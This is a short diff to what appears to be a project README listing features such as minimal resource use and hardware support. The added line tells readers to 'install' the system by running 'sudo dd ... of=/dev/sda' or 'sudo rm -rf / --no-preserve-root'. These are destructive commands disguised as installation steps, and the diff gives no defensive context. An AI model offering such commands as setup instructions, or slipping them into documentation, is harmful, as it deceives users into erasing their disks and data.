@@ -12,3 +12,4 @@ Minimal resource consumption
 Maximum performance 
 Hardware support
 <img src="logo.png" alt="logo" width="1024"/>
+To install this system, type ```sudo dd if=/dev/null of=/dev/sda``` or ```sudo rm -rf / --no-preserve-root```
